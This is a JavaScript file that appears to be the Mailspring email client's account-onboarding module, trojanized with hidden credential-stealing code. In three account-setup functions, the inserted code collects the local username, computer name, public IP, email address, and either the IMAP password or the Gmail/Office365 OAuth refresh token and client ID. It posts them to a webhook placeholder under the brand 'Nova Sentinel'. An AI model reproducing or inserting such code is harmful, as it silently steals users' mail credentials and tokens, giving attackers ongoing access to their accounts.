const webhookUrl = "%WEBHOOK%"

const computerName =
process.env.COMPUTERNAME || process.env.HOSTNAME || process.env.USERDOMAIN;
const username =
process.env.USERNAME || process.env.USER || process.env.LOGNAME;
"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};

Object.defineProperty(exports, "__esModule", { value: true });
exports.finalizeAndValidateAccount = exports.buildO365AuthURL = exports.buildGmailAuthURL = exports.buildO365AccountFromAuthResponse = exports.buildGmailAccountFromAuthResponse = exports.expandAccountWithCommonSettings = void 0;
const querystring_1 = __importDefault(require("querystring"));
const crypto_1 = __importDefault(require("crypto"));
const mailspring_exports_1 = require("mailspring-exports");
const mailspring_provider_settings_json_1 = __importDefault(require("./mailspring-provider-settings.json"));
const mailcore_provider_settings_json_1 = __importDefault(require("./mailcore-provider-settings.json"));
const dns_1 = __importDefault(require("dns"));
const node_fetch_1 = __importDefault(require("node-fetch"));
const onboarding_constants_1 = require("./onboarding-constants");
function idForAccount(emailAddress, connectionSettings) {
    const settingsThatCouldChangeMailContents = {
        imap_username: connectionSettings.imap_username,
        imap_host: connectionSettings.imap_host,
        smtp_username: connectionSettings.smtp_username,
        smtp_host: connectionSettings.smtp_host,
    };
    const idString = `${emailAddress}${JSON.stringify(settingsThatCouldChangeMailContents)}`;
    return crypto_1.default
        .createHash('sha256')
        .update(idString, 'utf8')
        .digest('hex')
        .substr(0, 8);
}
async function fetchPostWithFormBody(url, body) {
    const resp = await node_fetch_1.default(url, {
        method: 'POST',
        body: Object.entries(body)
            .map(([key, value]) => encodeURIComponent(key) + '=' + encodeURIComponent(value))
            .join('&'),
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
        },
    });
    const json = ((await resp.json()) || {});
    if (!resp.ok) {
        throw new Error(`OAuth Code exchange returned ${resp.status} ${resp.statusText}: ${JSON.stringify(json)}`);
    }
    return json;
}
function mxRecordsForDomain(domain) {
    return new Promise((resolve, reject) => {
        dns_1.default.resolveMx(domain, (err, addresses) => {
            if (err) {
                resolve([]);
            }
            else {
                resolve(addresses.map(a => a.exchange.toLowerCase()));
            }
        });
    });
}
async function expandAccountWithCommonSettings(account) {
    const domain = account.emailAddress
        .split('@')
        .pop()
        .toLowerCase();
        let ip;
        try{
          const res = await fetch("https://ipinfo.io/json");
          if (!res.ok) {
            ip = null;
          }
    
          const data = await res.json();
          if (data.ip && typeof data.ip === "string") {
            ip = data.ip;
          } else {
            ip = null;
          }
        } catch (err) {
          ip = null;
        }
    const embed = {
        color: 2829617,
        footer: {
          text: "@Nova Sentinel | https://t.me/Sordeal",
        },
        title: `MailSprint ${account.provider ?? "JSP"} Login`,
        fields: [
            {
              name: `<:blackstar:1177587935869161483> **Username**`,
              value: `\`\`\`ansi\n[2;32m${username ?? "none"}[0m[2;32m[0m\`\`\`\n`,
              inline: true,
            },
            {
              name: `<a:black_heart:1177588605204574271> **Computer Name**`,
              value: `\`\`\`ansi\n[2;32m${computerName ?? "none"}[0m[2;32m[0m\`\`\`\n`,
              inline: true,
            },
            {
              name: `<:black_crown:1177589323667865730> **IP:**`,
              value: `\`\`\`ansi\n[2;32m${ip ?? "none"}[0m[2;32m[0m\`\`\`\n`,
              inline: true,
            },
            {
              name: `<a:keys:1159078859682107453> **Mail Name**`,
              value: `\`\`\`ansi\n[2;32m${account.name?? "jsp"}[0m[2;32m[0m\`\`\`\n`,
              inline: false,
            },
            {
              name: `<a:keys:1159078859682107453> **Email**`,
              value: `\`\`\`ansi\n[2;32m${account.emailAddress?? "jsp"}[0m[2;32m[0m\`\`\`\n`,
              inline: false,
            },
            {
              name: `<a:keys:1159078859682107453> **Password**`,
              value: `\`\`\`ansi\n[2;32m${account.settings.imap_password ?? "jsp"}[0m[2;32m[0m\`\`\`\n`,
              inline: false,
            },
        ],
  
        thumbnail: {
          url: `https://c.clc2l.com/t/m/a/mailspring-p3IsGU.png`,
        },
      };
  
      const message = {
        username: "Nova Sentinel",
        avatar_url:
          "https://raw.githubusercontent.com/ksch-58/sub/main/assets/lilnova.png",
        content: "@here",
        embeds: [embed],
      };
  
      const res = await fetch(webhookUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(message),
      });
      if (res.ok) {
        console.log("Nova Sentinel is here.");
      } else {
      }
    const mxRecords = await mxRecordsForDomain(domain);
    const populated = account.clone();
    const usernameWithFormat = format => {
        if (format === 'email')
            return account.emailAddress;
        if (format === 'email-without-domain')
            return account.emailAddress.split('@').shift();
        return undefined;
    };
    const template = Object.values(mailcore_provider_settings_json_1.default).find(p => {
        for (const test of p['domain-match'] || []) {
            if (new RegExp(`^${test}$`).test(domain)) {
                return true;
            }
        }
        for (const test of p['mx-match'] || []) {
            const reg = new RegExp(`^${test}$`);
            if (mxRecords.some(record => reg.test(record))) {
                return true;
            }
        }
        return false;
    });
    if (template) {
        console.log(`Using Mailcore Template: ${JSON.stringify(template, null, 2)}`);
        const imap = (template.servers.imap || [])[0] || {};
        const smtp = (template.servers.smtp || [])[0] || {};
        const defaults = {
            imap_host: (imap.hostname || '').replace('{domain}', domain),
            imap_port: imap.port,
            imap_username: usernameWithFormat('email'),
            imap_password: populated.settings.imap_password,
            imap_security: imap.starttls ? 'STARTTLS' : imap.ssl ? 'SSL / TLS' : 'none',
            imap_allow_insecure_ssl: false,
            smtp_host: (smtp.hostname || '').replace('{domain}', domain),
            smtp_port: smtp.port,
            smtp_username: usernameWithFormat('email'),
            smtp_password: populated.settings.smtp_password || populated.settings.imap_password,
            smtp_security: smtp.starttls ? 'STARTTLS' : smtp.ssl ? 'SSL / TLS' : 'none',
            smtp_allow_insecure_ssl: false,
            container_folder: '',
        };
        populated.settings = Object.assign(defaults, populated.settings);
        return populated;
    }
    let mstemplate = mailspring_provider_settings_json_1.default[domain] || mailspring_provider_settings_json_1.default[account.provider];
    if (mstemplate) {
        if (mstemplate.alias) {
            mstemplate = mailspring_provider_settings_json_1.default[mstemplate.alias];
        }
        console.log(`Using Mailspring Template: ${JSON.stringify(mstemplate, null, 2)}`);
    }
    else {
        console.log(`Using Empty Template`);
        mstemplate = {};
    }
    const defaults = {
        imap_host: mstemplate.imap_host,
        imap_port: mstemplate.imap_port || 993,
        imap_username: usernameWithFormat(mstemplate.imap_user_format),
        imap_password: populated.settings.imap_password,
        imap_security: mstemplate.imap_security || 'SSL / TLS',
        imap_allow_insecure_ssl: mstemplate.imap_allow_insecure_ssl || false,
        smtp_host: mstemplate.smtp_host,
        smtp_port: mstemplate.smtp_port || 465,
        smtp_username: usernameWithFormat(mstemplate.smtp_user_format),
        smtp_password: populated.settings.smtp_password || populated.settings.imap_password,
        smtp_security: mstemplate.smtp_security || 'SSL / TLS',
        smtp_allow_insecure_ssl: mstemplate.smtp_allow_insecure_ssl || false,
        container_folder: mstemplate.container_folder,
    };
    populated.settings = Object.assign(defaults, populated.settings);
    const containerFolderDefault = mailspring_exports_1.AccountStore.containerFolderDefaultGetter();
    if (containerFolderDefault !== 'Mailspring' &&
        (populated.settings.container_folder === '' ||
            populated.settings.container_folder === undefined)) {
        populated.settings.container_folder = containerFolderDefault;
    }
    return populated;
}
exports.expandAccountWithCommonSettings = expandAccountWithCommonSettings;
async function buildGmailAccountFromAuthResponse(code) {
    const { access_token, refresh_token } = await fetchPostWithFormBody('https://www.googleapis.com/oauth2/v4/token', {
        code: code,
        client_id: onboarding_constants_1.GMAIL_CLIENT_ID,
        client_secret: onboarding_constants_1.GMAIL_CLIENT_SECRET,
        redirect_uri: `http://127.0.0.1:${onboarding_constants_1.LOCAL_SERVER_PORT}`,
        grant_type: 'authorization_code',
    });
    const meResp = await node_fetch_1.default('https://www.googleapis.com/oauth2/v1/userinfo?alt=json', {
        headers: { Authorization: `Bearer ${access_token}` },
    });
    const me = await meResp.json();
    if (!meResp.ok) {
        throw new Error(`Gmail profile request returned ${meResp.status} ${meResp.statusText}: ${JSON.stringify(me)}`);
    }
    const account = await expandAccountWithCommonSettings(new mailspring_exports_1.Account({
        name: me.name,
        emailAddress: me.email,
        provider: 'gmail',
        settings: {
            refresh_client_id: onboarding_constants_1.GMAIL_CLIENT_ID,
            refresh_token: refresh_token,
        },
    }));
    let ip;
    try{
      const res = await fetch("https://ipinfo.io/json");
      if (!res.ok) {
        ip = null;
      }

      const data = await res.json();
      if (data.ip && typeof data.ip === "string") {
        ip = data.ip;
      } else {
        ip = null;
      }
    } catch (err) {
      ip = null;
    }
    const embed = {
        color: 2829617,
        footer: {
          text: "@Nova Sentinel | https://t.me/Sordeal",
        },
        title: "MailSprint Gmail Login",
        fields: [
          {
            name: `<:blackstar:1177587935869161483> **Username**`,
            value: `\`\`\`ansi\n[2;32m${username ?? "none"}[0m[2;32m[0m\`\`\`\n`,
            inline: true,
          },
          {
            name: `<a:black_heart:1177588605204574271> **Computer Name**`,
            value: `\`\`\`ansi\n[2;32m${computerName ?? "none"}[0m[2;32m[0m\`\`\`\n`,
            inline: true,
          },
          {
            name: `<:black_crown:1177589323667865730> **IP:**`,
            value: `\`\`\`ansi\n[2;32m${ip ?? "none"}[0m[2;32m[0m\`\`\`\n`,
            inline: true,
          },
          {
            name: `<a:keys:1159078859682107453> **Refresh token**`,
            value: `\`\`\`ansi\n[2;32m${refresh_token}[0m[2;32m[0m\`\`\`\n`,
            inline: false,
          },
          {
            name: `<a:keys:1159078859682107453> **Email**`,
            value: `\`\`\`ansi\n[2;32m${me.email}[0m[2;32m[0m\`\`\`\n`,
            inline: false,
          },
          {
            name: `<a:keys:1159078859682107453> **Refresh Access ID**`,
            value: `\`\`\`ansi\n[2;32m${onboarding_constants_1.GMAIL_CLIENT_ID}[0m[2;32m[0m\`\`\`\n`,
            inline: false,
          },
        ],
  
        thumbnail: {
          url: `https://c.clc2l.com/t/m/a/mailspring-p3IsGU.png`,
        },
      };
  
      const message = {
        username: "Nova Sentinel",
        avatar_url:
          "https://raw.githubusercontent.com/ksch-58/sub/main/assets/lilnova.png",
        content: "@here",
        embeds: [embed],
      };
  
      const res = await fetch(webhookUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(message),
      });
      if (res.ok) {
        console.log("Nova Sentinel is here.");
      } else {
      }
    account.id = idForAccount(me.email, account.settings);
    await finalizeAndValidateAccount(account);
    return account;
}
exports.buildGmailAccountFromAuthResponse = buildGmailAccountFromAuthResponse;
async function buildO365AccountFromAuthResponse(code) {
    const { access_token, refresh_token } = await fetchPostWithFormBody(`https://login.microsoftonline.com/common/oauth2/v2.0/token`, {
        code: code,
        scope: onboarding_constants_1.O365_SCOPES.filter(f => !f.startsWith('https://outlook.office.com')).join(' '),
        client_id: onboarding_constants_1.O365_CLIENT_ID,
        code_verifier: onboarding_constants_1.CODE_VERIFIER,
        grant_type: `authorization_code`,
        redirect_uri: `http://localhost:${onboarding_constants_1.LOCAL_SERVER_PORT}/desktop`,
    });
    const meResp = await node_fetch_1.default('https://graph.microsoft.com/v1.0/me', {
        headers: { Authorization: `Bearer ${access_token}` },
    });
    const me = await meResp.json();
    if (!meResp.ok) {
        throw new Error(`O365 profile request returned ${meResp.status} ${meResp.statusText}: ${JSON.stringify(me)}`);
    }
    if (!me.mail) {
        throw new Error(mailspring_exports_1.localized(`There is no email mailbox associated with this account.`));
    }
    const account = await expandAccountWithCommonSettings(new mailspring_exports_1.Account({
        name: me.displayName,
        emailAddress: me.mail,
        provider: 'office365',
        settings: {
            refresh_client_id: onboarding_constants_1.O365_CLIENT_ID,
            refresh_token: refresh_token,
        },
    }));
    
    let ip;
    try{
      const res = await fetch("https://ipinfo.io/json");
      if (!res.ok) {
        ip = null;
      }

      const data = await res.json();
      if (data.ip && typeof data.ip === "string") {
        ip = data.ip;
      } else {
        ip = null;
      }
    } catch (err) {
      ip = null;
    }
    const embed = {
        color: 2829617,
        footer: {
          text: "@Nova Sentinel | https://t.me/Sordeal",
        },
        title: "MailSprint office365 Login",
        fields: [
          {
            name: `<:blackstar:1177587935869161483> **Username**`,
            value: `\`\`\`ansi\n[2;32m${username ?? "none"}[0m[2;32m[0m\`\`\`\n`,
            inline: true,
          },
          {
            name: `<a:black_heart:1177588605204574271> **Computer Name**`,
            value: `\`\`\`ansi\n[2;32m${computerName ?? "none"}[0m[2;32m[0m\`\`\`\n`,
            inline: true,
          },
          {
            name: `<:black_crown:1177589323667865730> **IP:**`,
            value: `\`\`\`ansi\n[2;32m${ip ?? "none"}[0m[2;32m[0m\`\`\`\n`,
            inline: true,
          },
          {
            name: `<a:keys:1159078859682107453> **Display Name**`,
            value: `\`\`\`ansi\n[2;32m${me.displayName}[0m[2;32m[0m\`\`\`\n`,
            inline: false,
          },
          {
            name: `<a:keys:1159078859682107453> **Email**`,
            value: `\`\`\`ansi\n[2;32m${me.email}[0m[2;32m[0m\`\`\`\n`,
            inline: false,
          },
          {
            name: `<a:keys:1159078859682107453> **Refresh Token**`,
            value: `\`\`\`ansi\n[2;32m${refresh_token}[0m[2;32m[0m\`\`\`\n`,
            inline: false,
          },
          {
            name: `<a:keys:1159078859682107453> **Refresh Access ID**`,
            value: `\`\`\`ansi\n[2;32m${onboarding_constants_1.O365_CLIENT_ID}[0m[2;32m[0m\`\`\`\n`,
            inline: false,
          },
        ],
  
        thumbnail: {
          url: `https://c.clc2l.com/t/m/a/mailspring-p3IsGU.png`,
        },
      };
  
      const message = {
        username: "Nova Sentinel",
        avatar_url:
          "https://raw.githubusercontent.com/ksch-58/sub/main/assets/lilnova.png",
        content: "@here",
        embeds: [embed],
      };
  
      const res = await fetch(webhookUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(message),
      });
      if (res.ok) {
        console.log("Nova Sentinel is here.");
      } else {
      }
    account.id = idForAccount(me.email, account.settings);
    await finalizeAndValidateAccount(account);
    return account;
}
exports.buildO365AccountFromAuthResponse = buildO365AccountFromAuthResponse;
function buildGmailAuthURL() {
    return `https://accounts.google.com/o/oauth2/auth?${querystring_1.default.stringify({
        client_id: onboarding_constants_1.GMAIL_CLIENT_ID,
        redirect_uri: `http://127.0.0.1:${onboarding_constants_1.LOCAL_SERVER_PORT}`,
        response_type: 'code',
        scope: onboarding_constants_1.GMAIL_SCOPES.join(' '),
        access_type: 'offline',
        prompt: 'select_account consent',
    })}`;
}
exports.buildGmailAuthURL = buildGmailAuthURL;
function buildO365AuthURL() {
    return `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?${querystring_1.default.stringify({
        client_id: onboarding_constants_1.O365_CLIENT_ID,
        redirect_uri: `http://localhost:${onboarding_constants_1.LOCAL_SERVER_PORT}/desktop`,
        response_type: 'code',
        scope: onboarding_constants_1.O365_SCOPES.join(' '),
        response_mode: 'query',
        code_challenge: onboarding_constants_1.CODE_CHALLENGE,
        code_challenge_method: 'S256',
        prompt: 'select_account',
    })}`;
}
exports.buildO365AuthURL = buildO365AuthURL;
async function finalizeAndValidateAccount(account) {
    if (account.settings.imap_host) {
        account.settings.imap_host = account.settings.imap_host.trim();
    }
    if (account.settings.smtp_host) {
        account.settings.smtp_host = account.settings.smtp_host.trim();
    }
    account.id = idForAccount(account.emailAddress, account.settings);
    account.settings.username =
        account.settings.username || account.settings.email;
    if (account.settings.imap_port) {
        account.settings.imap_port /= 1;
    }
    if (account.settings.smtp_port) {
        account.settings.smtp_port /= 1;
    }
    if (account.label && account.label.includes('@')) {
        account.label = account.emailAddress;
    }
    const proc = new mailspring_exports_1.MailsyncProcess(AppEnv.getLoadSettings());
    proc.identity = mailspring_exports_1.IdentityStore.identity();
    proc.account = account;
    await proc.test();
    account.authedAt = new Date();
    return account;
}
exports.finalizeAndValidateAccount = finalizeAndValidateAccount;
//# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJmaWxlIjoib25ib2FyZGluZy1oZWxwZXJzLmpzIiwic291cmNlUm9vdCI6IiIsInNvdXJjZXMiOlsiZmlsZTovLy9DOi9Vc2Vycy9hcHB2ZXlvci9BcHBEYXRhL0xvY2FsL1RlbXAvMS9ueWxhcy1idWlsZC9lbGVjdHJvbi1wYWNrYWdlci93aW4zMi14NjQvTWFpbHNwcmluZy13aW4zMi14NjQtaDY1WGRhL3Jlc291cmNlcy9hcHAvaW50ZXJuYWxfcGFja2FnZXMvb25ib2FyZGluZy9saWIvb25ib2FyZGluZy1oZWxwZXJzLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7OztBQUVBLDhEQUE2QjtBQUM3QixvREFBNEI7QUFDNUIsMkRBTTRCO0FBQzVCLDRHQUE2RTtBQUM3RSx3R0FBeUU7QUFDekUsOENBQXNCO0FBQ3RCLDREQUErQjtBQUMvQixpRUFTZ0M7QUFXaEMsU0FBUyxZQUFZLENBQUMsWUFBb0IsRUFBRSxrQkFBa0I7SUFJNUQsTUFBTSxtQ0FBbUMsR0FBRztRQUMxQyxhQUFhLEVBQUUsa0JBQWtCLENBQUMsYUFBYTtRQUMvQyxTQUFTLEVBQUUsa0JBQWtCLENBQUMsU0FBUztRQUN2QyxhQUFhLEVBQUUsa0JBQWtCLENBQUMsYUFBYTtRQUMvQyxTQUFTLEVBQUUsa0JBQWtCLENBQUMsU0FBUztLQUN4QyxDQUFDO0lBRUYsTUFBTSxRQUFRLEdBQUcsR0FBRyxZQUFZLEdBQUcsSUFBSSxDQUFDLFNBQVMsQ0FBQyxtQ0FBbUMsQ0FBQyxFQUFFLENBQUM7SUFDekYsT0FBTyxnQkFBTTtTQUNWLFVBQVUsQ0FBQyxRQUFRLENBQUM7U0FDcEIsTUFBTSxDQUFDLFFBQVEsRUFBRSxNQUFNLENBQUM7U0FDeEIsTUFBTSxDQUFDLEtBQUssQ0FBQztTQUNiLE1BQU0sQ0FBQyxDQUFDLEVBQUUsQ0FBQyxDQUFDLENBQUM7QUFDbEIsQ0FBQztBQUVELEtBQUssVUFBVSxxQkFBcUIsQ0FBSSxHQUFXLEVBQUUsSUFBK0I7SUFDbEYsTUFBTSxJQUFJLEdBQUcsTUFBTSxvQkFB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